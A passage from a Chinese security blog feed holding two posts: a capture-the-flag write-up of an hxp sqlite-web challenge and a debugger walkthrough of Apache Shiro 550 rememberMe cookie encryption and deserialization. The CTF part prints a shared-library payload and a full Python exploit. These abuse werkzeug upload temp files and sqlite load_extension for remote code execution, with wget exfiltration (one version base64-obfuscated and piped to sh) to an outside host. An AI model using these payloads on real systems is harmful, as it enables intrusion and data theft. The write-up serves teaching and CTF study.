&lt;/ul&gt;
&lt;p&gt;PS :  在这个题里面，所有的表（除了ascii这个表），都只有一行数据&lt;/p&gt;
&lt;p&gt;我们先从第一层的With语句整体分析一下
&lt;code&gt;WITH bytes(i, s)  AS (用来生成bytes临时表的查询语句)  调用bytes临时表的查询语句&lt;/code&gt;
这里先是定义了一个名为bytes临时表，这个临时表一共就两列，一列叫做i，一列叫做s&lt;/p&gt;
&lt;p&gt;关于具体的定义语句，咱们这里跟进一下第二层结构
&lt;code&gt;VALUES(1, &apos;&apos;) UNION ALL SELECT i + 1,（用来生成第二列数据的查询语句，这里给这个列取了别名c）AS c FROM bytes WHERE c &amp;lt;&amp;gt; &apos;&apos; limit 64 offset 1&lt;/code&gt;
VALUES语句给i列和s列分别插入了一条数据，i列插入的是1，s插入的是个空字符。
插入完之后，&lt;code&gt;UNION ALL&lt;/code&gt; 之后的语句开始执行，其返回结果会与前面的  &lt;code&gt;VALUES(1,&apos;&apos;)&lt;/code&gt; 值拼接起来，构成一个新表。咱们看一下后面的语句，可以发现，其第一个表达式是 &lt;code&gt;i + 1&lt;/code&gt;，其中的 &lt;code&gt;i&lt;/code&gt; 表示从前一个查询中选出来的整数值，&lt;code&gt;+ 1&lt;/code&gt; 表示将该整数值加一。因此，第二个查询返回的整数值是从 2 开始递增的。第二个表达式是一个子查询，它返回从 &lt;code&gt;bytes&lt;/code&gt; 表中选择所有 &lt;code&gt;c&lt;/code&gt; 列不为 &lt;code&gt;&apos;&apos;&lt;/code&gt; 的行，按照行号的顺序选择前 64 行并跳过第一行（也就是前面提到的 &lt;code&gt;(1, &apos;&apos;)&lt;/code&gt; 行）。&lt;/p&gt;
&lt;p&gt;分析完第二层结构，咱们先不急着分析第三层结构，这里咱们直接从第五层结构开始倒着分析（要时刻牢记3-5层结构的最终返回结果就是条简单的数据）。&lt;/p&gt;
&lt;p&gt;第五层结构
&amp;gt; K列：SELECT asciicode from ascii where hexcode = hex(SUBSTR(sha512(&apos;hxp{REDACTED}&apos;), i, 1))
&amp;gt; V列：SELECT asciicode from ascii where hexcode = hex(SUBSTR(encrypted, i, 1))
//encrypted是mw里面的列
这里用到了ascii这个表，咱们可以看一下这个表的结构
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/hxf-sqlite-less1.png&quot; alt=&quot;&quot; /&gt;
emmm，平平无奇，不多赘述
依次从&lt;code&gt;sha512(&apos;hxp{REDACTED}&apos;)&lt;/code&gt; 和 &lt;code&gt;encrypted&lt;/code&gt;这两行数据里面截取字符，分别作为k列的生成条件和v列的生成条件，最终k列和v列都新增了一行数字数据。&lt;/p&gt;
&lt;p&gt;跳到第四层看一下
&lt;code&gt;SELECT  (第五层结构之k列的生成) as k, (第五层结构之v列的生成) as v FROM mw&lt;/code&gt;
也是平平无奇的很，就是把k列和v列整合了起来作为了一个临时表给返了回去&lt;/p&gt;
&lt;p&gt;再看下第三层结构
&lt;code&gt;SELECT ((v|k)-(v&amp;amp;k)) &amp;amp; 255 FROM (第四层结构)&lt;/code&gt;
把v列的那一行数据和k列的那一行数据从第四层结构生成的那个临时表取了过来，做位运算，生成了一个只有一列一行数据的临时表&lt;/p&gt;
&lt;p&gt;回溯到第二层
到这里那个c列数据的整个生成流程就已经明晰了，就是第三层位运算得来的那个数据。
就这么递归生成呗，出来的表是下面这样的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/hxf-sqliteweb-02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;到这里要是还感觉不清楚的话，可以去多多了解一下SQL的递归查询，本文也就先不多说了，咱们开始做题&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;这个题目和之前接触过的Nginx缓存上传临时文件的题目(虎符CTF ezphp)很像，官方wp是这么说的&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;The interface runs on [flask] which runs on [werkzeug]

Just like [last time nginx](hxp-CTF-2021-includers-revenge), werkzeug creates temporary files for file uploads. The file only has to be bigger than [500kB]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;大体意思就是说，sqlite基于flask运行，而flask又基于werkzeug运行，而werkzeug有一个和nginx缓存文件相当类似的保存机制，所以我们能够利用类似nginx缓存上传so文件的方法上传csv文件
(不是Request Body那一个)&lt;/p&gt;
&lt;p&gt;这是缓存部分的相关代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def default_stream_factory(
    total_content_length: t.Optional[int],
    content_type: t.Optional[str],
    filename: t.Optional[str],
    content_length: t.Optional[int] = None,
) -&amp;gt; t.IO[bytes]:
    max_size = 1024 * 500

    if SpooledTemporaryFile is not None:
        return t.cast(t.IO[bytes], SpooledTemporaryFile(max_size=max_size, mode=&quot;rb+&quot;))
    elif total_content_length is None or total_content_length &amp;gt; max_size:
        return t.cast(t.IO[bytes], TemporaryFile(&quot;rb+&quot;))

    return BytesIO()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;大体审计一下，就是说在以下两种情况，我们可以让其在本地产生缓存文件&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果&lt;code&gt;SpooledTemporaryFile&lt;/code&gt;可用，那么会返回一个&lt;code&gt;SpooledTemporaryFile&lt;/code&gt;类型的文件对象。&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;total_content_length&lt;/code&gt;为空或大于&lt;code&gt;max_size&lt;/code&gt;，那么会返回一个&lt;code&gt;TemporaryFile&lt;/code&gt;类型的文件对象。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们编译完csv文件之后的大小是527kb , 连脏数据都不需要写，直接传就行。&lt;/p&gt;
&lt;p&gt;然后就是要编辑我们的so文件了，因为这个题目的flag只能通过/readflag来读取，并且没有回显数据
我们可以用老一套的dnslog带外来解决这个问题&lt;/p&gt;
&lt;p&gt;附上官方写的c文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void flag() {{
    system(&quot;wget --post-data `/readflag` http://{my_host}:{my_port}&quot;);
}}

void space() {{
    // this just exists so the resulting binary is &amp;gt; 500kB
    static char waste[500 * 1024] = {{2}};
}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编译命令如下:
&lt;code&gt;gcc -shared rce.c -o exploit.csv&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到exploit.csv之后，我们直接编写&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from threading import Thread
import requests
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import sys

EXPLOIT = &apos;rce.csv&apos;

HOST = &apos;127.0.0.1&apos;
PORT = 9002

def send_rce():
    print(&apos;[+] uploader started&apos;, file=sys.stderr)
    while True:
        r = requests.post(url=f&quot;http://{HOST}:{PORT}/gz/import/&quot;,
        files={
            &apos;file&apos;: open(EXPLOIT, &apos;rb&apos;)
        })
        print(r.status_code, &quot;UPLOAD&quot;, file=sys.stderr)

def call_rce(fd):
    print(&apos;[+] caller started&apos;, file=sys.stderr)
    while True:
        r = requests.post(url=f&quot;http://{HOST}:{PORT}/gz/query&quot;,
        data={
            &quot;sql&quot;: f&quot;&quot;&quot;select load_extension(&quot;/proc/self/fd/{fd}&quot;,&quot;flag&quot;)&quot;&quot;&quot;
        })
        print(r.status_code, &quot;CALL&quot;, file=sys.stderr)

def compile_exploit():
    with open(&quot;rce.c&quot;, &quot;w&quot;) as f:
        f.write(f&quot;&quot;&quot;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void flag() {{
    system(&quot;echo d2dldCAtLXBvc3QtZGF0YT0idXNlcm5hbWU9JCgvcmVhZGZsYWcpIiBodHRwOi8vNTZkZThkNGUtMDdhOS00NjFmLWEyZjktY2E2OWUzZTNmNjcyLm5vZGU0LmJ1dW9qLmNuOjgxL2luZGV4LnBocA==|base64 -d|sh&quot;);
}}

void space() {{
    static char waste[500 * 1024] = {{2}};
}}
&quot;&quot;&quot;)
    r = subprocess.run([&quot;gcc&quot;, &quot;-shared&quot;, &quot;rce.c&quot;, &quot;-o&quot;, EXPLOIT])
    if r.returncode != 0:
        exit(-1)

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_len = int(self.headers.get(&apos;Content-Length&apos;))
        flag = self.rfile.read(content_len)
        print(flag.decode())

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

def server():
    print(&apos;[+] http server started&apos;, file=sys.stderr)
    server = ThreadingSimpleServer((&apos;0.0.0.0&apos;, MY_PORT), Handler)
    # we only need to handle one response
    server.handle_request()
    server.shutdown()

if __name__ == &quot;__main__&quot;:
    compile_exploit()

    s = Thread(target=server, daemon=True)
    s.start()

    t1 = Thread(target=send_rce, daemon=True)
    t1.start()
    for i in range(7, 8):
        t2 = Thread(target=call_rce, daemon=True, args=(i,))
        t2.start()

    s.join()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;emm，，其实官方的一把梭poc写的就很不错
经典的wget带外（这里很离谱，官方的docker环境里面没有curl，当时用curl跑就一直出不来）
由于这里涉及到一些双引号转义的问题，太麻烦了，直接用base64编码的形式跑也是一样的&lt;/p&gt;
&lt;p&gt;结果如下:
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/sqliteweb-04.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Shiro550流程简析</title><link>https://f4miti0n.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</guid><pubDate>Wed, 29 Mar 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;流程调试之加密&lt;/h2&gt;
&lt;p&gt;根据网上的复现文章，我们知道在登录的时候会先调用DeafultSecurityManager这个类里面的login方法，这里直接来到这个目标类里，给Login方法加上一个断点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B001.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;流程解释
这里是在这个info这里先停了一下，根据我们传入的token对象，实例化一个名为info的AuthenticationInfo对象（token的属性包括当前输入的账号和密码，host路径和remeberme选项），这里的try和catch语句相当于一个判断是否登录成功的if语句
相关解释如下(来自new bing):
(  &lt;code&gt;AuthenticationException 是一个 Java 异常类，当访问命名或目录服务时发生身份验证错误时抛出此异常。例如，当用户程序提供的凭据无效或以其他方式无法将用户验证到命名/目录服务时，可能会发生身份验证错误&lt;/code&gt;  )
这里我们是登录成功了，直接跳到如下部分
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2002.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;根据本类定义的createSubject方法生成了一个名为loggedIn的对象
这里因为login这个方法最终的返回值就是我们的loggedIn对象，我们给loggedIn这里打上一个断点，持续跟踪它，这里先跟进一下createSubject这个方法的定义
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B003.png&quot; alt=&quot;&quot; /&gt;
相当麻烦，又出来了很多新的量，先继续跟进一下creatSubjectContext()这个方法，代码部分相当简单，就只是return了一个DefaultSubjectContext的无参构造，这里直接贴一下DefaultSubjectContext的属性定义部分，没发现和我们Cookie直接相关的属性，步出回到createSubject这里&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2004.png&quot; alt=&quot;&quot; /&gt;
来到实际调用的createSubject重载方法这里
后面对这些涉及的方法都跟进了一下，没发现和cookie生成有关的部分，步出回到第二步。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2005.png&quot; alt=&quot;&quot; /&gt;
跟进onSuccessfulLogin方法
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%20%E5%A4%8D%E7%8E%B006.png&quot; alt=&quot;&quot; /&gt;
跟进rememberMeSuccessfulLogin方法
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2007.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进第一行的getRemberMeManager()
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2008.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里是直接返回了一个名为remeberMeManager对象,其属性大致如下
可以看到，相关加密的模式，秘钥都在此设定
其余的属性如cookie的设定也在此有迹可循
估计后面的cookie加密就是对此对象操作,给此对象加个断点,重点关注
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2009.png&quot; alt=&quot;&quot; /&gt;
继续步出回到remeberMeSuccessLogin这里
步入onSuccessfullLogin方法(经过调试,这个方法就是remeberMesuccessfullLogin执行的最后一步1)
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%20%E5%A4%8D%E7%8E%B010.png&quot; alt=&quot;&quot; /&gt;
emmm,,别忘了,这里的subject就是我们一开始传入的loggedin,这里第一行代码调用了一下，还是要跟进以下的(仔细看了一下,这个subject的属性里面也嵌套着一个remeberMeManager)。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2011.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;直接步入最终实际调用的重载结果
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2012.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里跟进一下着两个部分
(总结分析一下，就是对rememberMe这个cookie字段进行一些基本的设置，并不涉及加密过程，重新步出分析,默认把rememberMe这个字段的初始值设置为deleteme)
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2013.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2014.png&quot; alt=&quot;&quot; /&gt;
这里会先进行一个remeberMe选项是否勾上了的判断
(这个值在token里,勾上了则进行下面的部分,对rememberMe字段的值进行修改)
这里是运行到了remeberIdentity这里，继续跟进
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2015.png&quot; alt=&quot;&quot; /&gt;
出来的定义如下，不知道这里的principals对象是干什么的，但这显然不是终点，继续跟进真实调用的rememberIdentity方法
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2016.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;出来了这么个具体方法
这里的第一个方法调用了我们刚才定义的principals对象，读方法名感觉应该是和序列化有关的一个方法
，再度跟进
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%20%E5%A4%8D%E7%8E%B017.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;得到如下定义
第一行很简单，对principals对象进行序列化处理，再把结果存入bytes数组中(从这里大体可以猜测出来,principals对象应该是通过我们传入的用户名和密码实例化出的对象)
第二行就是检测当前是否存在相应的加密方法，跟进审计了一下，能够发现当前的加密方式为AES加密，存在加密方法，可以进行加密。
跟进审计encrypt方法。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2018.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2019.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最后几步了，详细一点，encrypt这个方法本质上还是套用的cipherService.encrypt这个方法(感觉可以直接在刚才的类里调用这个....)，其实这里一看就知道是对序列化对象进行aes加密，就不跟进了，分析这种加密源码还是挺有难度的，我们直接步出。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2020.png&quot; alt=&quot;&quot; /&gt;
回到rememberIdentity , 最后一步了 , 调用rememberSerializedIdentity方法，我们跟进一下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2021.png&quot; alt=&quot;&quot; /&gt;
rememberSerializedIdentity部分代码如下
这里只筛选了关键部分，前面的常规传值没贴出来
可以看到rememberSerializedIdentity方法对我们aes加密后的序列化数据又进行了一次base64编码,并且把这个值设给了cookie（看了一下，这里的cookie对象就是我们的rememberMe）
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2022.png&quot; alt=&quot;&quot; /&gt;
至此，rememberMe的cookie生成完毕&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;流程调试之解密&lt;/h2&gt;
&lt;p&gt;这里我们不知道到底是在哪里进行的解密流程，但我们在AbstractRememberMeManager这个类里面找到了一个名为decrypt的方法(和encrypt方法在同一个类下)
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2023.png&quot; alt=&quot;&quot; /&gt;
查看调用帧，查看调用的层次结构关系
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%20%E5%A4%8D%E7%8E%B024.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2025.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2026.png&quot; alt=&quot;&quot; /&gt;
我们最终选择追溯到resolvePrincipals这里便停止追溯。
（根据上面加密部分的调试，我们知道这里Principals与cookie关系紧密）
大体看一眼然后跟进getRememberedIdentity方法。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2027.png&quot; alt=&quot;&quot; /&gt;
跟进getRememberMeManager方法
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2028.png&quot; alt=&quot;&quot; /&gt;
返回结果如下:
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2029.png&quot; alt=&quot;&quot; /&gt;
步出,跟进getRememberPrincipals方法
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2030.png&quot; alt=&quot;&quot; /&gt;
来到这个地方跟进一下getRememberSerializedIdentity方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2031.png&quot; alt=&quot;&quot; /&gt;
直接看关键部分
&lt;code&gt;String base64 = getCookie().readValue(request, response);&lt;/code&gt;
把cookie值取出来，进行base64解密，返回一个decoded
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2032.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;得到了bytes数组后，我们继续跟进一下这个部分，一看就是跟反序列化有关的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2033.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;大象真白了(雾)
我们最后再进到这个反序列化方法看一看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2034.png&quot; alt=&quot;&quot; /&gt;
大体如下，很普通的反序列化实现
至此，Shiro 550流程分析完成
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Shiro%E5%A4%8D%E7%8E%B0%2035.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item></channel></rss>